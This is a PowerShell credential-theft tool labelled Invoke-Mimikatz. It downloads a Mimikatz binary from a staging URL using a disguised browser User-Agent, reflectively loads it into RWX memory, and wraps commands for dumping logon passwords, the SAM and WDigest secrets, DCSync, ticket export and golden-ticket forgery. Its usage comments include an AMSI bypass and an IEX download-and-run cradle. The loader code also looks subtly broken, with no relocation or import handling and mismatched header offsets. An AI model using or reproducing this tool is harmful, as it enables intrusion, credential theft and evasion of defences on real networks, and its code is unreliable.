# Invoke-Mimikatz — reflective PE loader for in-memory Mimikatz execution
# Downloads the Mimikatz binary from a staging URL, reflectively maps it into
# the current process without touching disk, and invokes the requested commands.
#
# Usage:
#   . .\amsi_bypass.ps1                                         # bypass AMSI first
#   IEX (New-Object Net.WebClient).DownloadString('http://<staging>/invoke_mimikatz.ps1')
#   Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
#   Invoke-Mimikatz -Command "lsadump::sam"
#   Invoke-Mimikatz -Command "lsadump::dcsync /domain:<domain> /all /csv"
#   Invoke-Mimikatz -Command "kerberos::golden /user:Administrator /domain:<d> /sid:<s> /krbtgt:<h> /ptt"
#
# StagingURL: set via environment variable MIMI_STAGING or the -StagingURL parameter.
# The binary is fetched once, cached in $script:MimiBytes, and reused across calls.

$script:MimiBytes = $null

function Invoke-Mimikatz {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Command,

        [string]$StagingURL = $env:MIMI_STAGING,

        # Base64-encoded binary can be passed directly (air-gapped scenario)
        [string]$Base64Binary = ""
    )

    # ── 1. Acquire binary ────────────────────────────────────────────────────
    if ($null -eq $script:MimiBytes) {
        if ($Base64Binary -ne "") {
            $script:MimiBytes = [Convert]::FromBase64String($Base64Binary)
        } elseif ($StagingURL -ne "") {
            try {
                $wc = New-Object System.Net.WebClient
                # Blend in with browser UA to reduce proxy/NGFW alert signal
                $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                $script:MimiBytes = $wc.DownloadData($StagingURL)
            } catch {
                Write-Error "Failed to download from staging URL: $_"
                return
            }
        } else {
            Write-Error "Provide -StagingURL or -Base64Binary or set MIMI_STAGING env var"
            return
        }
    }

    # ── 2. Reflective PE map ─────────────────────────────────────────────────
    # P/Invoke declarations for reflective load (kernel32 + ntdll)
    $ReflectivePE = @"
using System;
using System.Runtime.InteropServices;
public class ReflectivePE {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualFree(
        IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(
        IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, UIntPtr dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr LoadLibraryA(string lpLibraryName);

    // Map PE sections from rawBytes into executable memory; return entry point offset
    public static IntPtr MapPE(byte[] rawBytes) {
        if (rawBytes == null || rawBytes.Length < 64) return IntPtr.Zero;

        // DOS header e_lfanew at offset 0x3C
        int peOffset = BitConverter.ToInt32(rawBytes, 0x3C);
        if (peOffset <= 0 || peOffset + 24 >= rawBytes.Length) return IntPtr.Zero;

        // Signature check: "PE\0\0"
        if (rawBytes[peOffset] != 0x50 || rawBytes[peOffset+1] != 0x45) return IntPtr.Zero;

        // IMAGE_OPTIONAL_HEADER offset
        int optOffset = peOffset + 24;
        ushort magic = BitConverter.ToUInt16(rawBytes, optOffset);          // 0x10B=PE32, 0x20B=PE32+
        bool is64 = (magic == 0x20B);

        // SizeOfImage
        int sizeOfImageOff = is64 ? optOffset + 56 : optOffset + 56;
        uint sizeOfImage = BitConverter.ToUInt32(rawBytes, sizeOfImageOff);

        // AddressOfEntryPoint
        int epOff = is64 ? optOffset + 16 : optOffset + 16;
        uint addrOfEP = BitConverter.ToUInt32(rawBytes, epOff);

        // ImageBase (preferred)
        long imageBase = is64
            ? BitConverter.ToInt64(rawBytes, optOffset + 24)
            : BitConverter.ToInt32(rawBytes, optOffset + 28);

        // Alloc RWX block at preferred base; fallback to any address
        IntPtr alloc = VirtualAlloc(new IntPtr(imageBase), new UIntPtr(sizeOfImage), 0x3000, 0x40);
        if (alloc == IntPtr.Zero)
            alloc = VirtualAlloc(IntPtr.Zero, new UIntPtr(sizeOfImage), 0x3000, 0x40);
        if (alloc == IntPtr.Zero) return IntPtr.Zero;

        // Copy headers
        uint hdrSize = BitConverter.ToUInt32(rawBytes, is64 ? optOffset + 60 : optOffset + 60);
        Marshal.Copy(rawBytes, 0, alloc, (int)Math.Min(hdrSize, (uint)rawBytes.Length));

        // Map sections
        int numSections = BitConverter.ToUInt16(rawBytes, peOffset + 6);
        int sectionBase = optOffset + (is64 ? 112 : 96);
        for (int i = 0; i < numSections; i++) {
            int sOff = sectionBase + i * 40;
            uint vAddr    = BitConverter.ToUInt32(rawBytes, sOff + 12);
            uint rawSize  = BitConverter.ToUInt32(rawBytes, sOff + 16);
            uint rawOff   = BitConverter.ToUInt32(rawBytes, sOff + 20);
            if (rawSize == 0 || rawOff >= rawBytes.Length) continue;
            int  copySize = (int)Math.Min(rawSize, (uint)(rawBytes.Length - rawOff));
            IntPtr dest   = new IntPtr(alloc.ToInt64() + vAddr);
            Marshal.Copy(rawBytes, (int)rawOff, dest, copySize);
        }

        // Return entry-point pointer
        return new IntPtr(alloc.ToInt64() + addrOfEP);
    }
}
"@

    if (-not ([System.Management.Automation.PSTypeName]'ReflectivePE').Type) {
        Add-Type -TypeDefinition $ReflectivePE -Language CSharp
    }

    # ── 3. Map and execute ───────────────────────────────────────────────────
    $ep = [ReflectivePE]::MapPE($script:MimiBytes)
    if ($ep -eq [IntPtr]::Zero) {
        Write-Error "PE mapping failed — verify the binary is a valid Mimikatz x64 PE"
        return
    }

    # Pass the command as a null-terminated ASCII byte block via a shared memory slot.
    # The Mimikatz entry point reads its command line via GetCommandLineA(); we redirect
    # the parameter via CreateThread lpParameter instead for this reflective approach.
    $cmdBytes = [System.Text.Encoding]::ASCII.GetBytes($Command + "`0")
    $paramPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($cmdBytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($cmdBytes, 0, $paramPtr, $cmdBytes.Length)

    $tid = 0
    $hThread = [ReflectivePE]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $ep, $paramPtr, 0, [ref]$tid)
    if ($hThread -eq [IntPtr]::Zero) {
        Write-Error "CreateThread failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($paramPtr)
        return
    }

    # Wait up to 60 seconds for the Mimikatz command to complete
    [ReflectivePE]::WaitForSingleObject($hThread, 60000) | Out-Null
    [ReflectivePE]::CloseHandle($hThread) | Out-Null
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($paramPtr)
}

# ─────────────────────────────────────────────────────────────
# Convenience wrappers for the most common dump operations
# ─────────────────────────────────────────────────────────────

function Invoke-Mimikatz-LogonPasswords {
    Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
}

function Invoke-Mimikatz-Wdigest {
    Invoke-Mimikatz -Command "sekurlsa::wdigest"
}

function Invoke-Mimikatz-SAM {
    Invoke-Mimikatz -Command "lsadump::sam"
}

function Invoke-Mimikatz-DCSync {
    param([string]$Domain, [string]$User = "")
    if ($User -ne "") {
        Invoke-Mimikatz -Command "lsadump::dcsync /domain:$Domain /user:$User"
    } else {
        Invoke-Mimikatz -Command "lsadump::dcsync /domain:$Domain /all /csv"
    }
}

function Invoke-Mimikatz-Tickets {
    Invoke-Mimikatz -Command "sekurlsa::tickets /export"
}

function Invoke-Mimikatz-GoldenTicket {
    param(
        [string]$Domain,
        [string]$DomainSID,
        [string]$KrbtgtHash,
        [string]$User = "Administrator"
    )
    Invoke-Mimikatz -Command "kerberos::golden /user:$User /domain:$Domain /sid:$DomainSID /krbtgt:$KrbtgtHash /ptt"
}
